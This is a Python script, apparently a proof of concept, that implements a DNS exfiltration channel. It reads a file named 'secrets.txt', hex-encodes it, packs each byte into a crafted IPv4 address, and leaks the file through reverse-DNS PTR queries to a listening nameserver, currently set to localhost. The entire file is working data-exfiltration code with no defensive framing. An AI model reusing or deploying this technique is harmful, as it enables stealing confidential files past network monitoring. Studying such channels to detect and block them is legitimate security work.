from dns import resolver, reversename, message, query
import socket, errno
import random
import os

baseline = 0

def send_data(set_baseline=False,octet=0):
    global baseline
    beginning_octet = ""
    if set_baseline:
        baseline = random.randrange(49152,65279)
        string_port = str(baseline)
        beginning_octet = "172"
    else:
        port_number = baseline + octet
        string_port = str(port_number)
        beginning_octet = "104"

    octets  = [string_port[0:2],string_port[2:4]]
    for x in range(len(octets)):
        if len(octets[x]) > 1:
            if octets[x][0] == "0":
                octets[x] = octets[x].replace("0","")
    constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{string_port[4:5]}"
    reverse_dns_dnspython(f"{constructed}")
    if set_baseline:
        print(f"[!] Established new set_baseline as: {baseline}")
    else:
        print(f"[*] Sent data as {constructed}")

def convert_to_ipv4(portion):
    ipv4_address_elements = []
    for byte in portion:
        ipv4_address_elements.append(str(int(byte,16)))

    index = 0
    while index < (len(ipv4_address_elements)):
        print(f"Sending byte: {ipv4_address_elements[index]}")
        send_data(octet=int(ipv4_address_elements[index]))
        index+=1

def reverse_dns_dnspython(ip_address):
    req_name = reversename.from_address(ip_address)
    res = resolver.Resolver()
    res.nameservers = ['127.0.0.1']
    res.port = 49250
    res.timeout=0.1
    res.lifetime=0.1

    try:
        res.resolve(req_name, "PTR")
    except Exception as e:
        pass

if __name__ == "__main__":
    if os.path.isfile("recovered"):
        os.remove("recovered")

    with open("secrets.txt","rb") as f:
        data = f.read().hex()

    segmented = [data[i:i+2] for i in range(0, len(data), 2)]
    print(len(segmented))

    send_data(set_baseline=True)

    prior = 0
    for index in range(0,len(segmented)):
        if index!=0 and index%4==0:
            portion = segmented[prior:index]
            prior = index
            convert_to_ipv4(portion)

    diff = len(segmented) - prior
    if (4-diff) >= 0:
        portion = segmented[prior:]
        for x in range(4-diff):
            portion.append('00')
        convert_to_ipv4(portion)

    reverse_dns_dnspython("104.6.7.2")
    print(f"Sent all data.")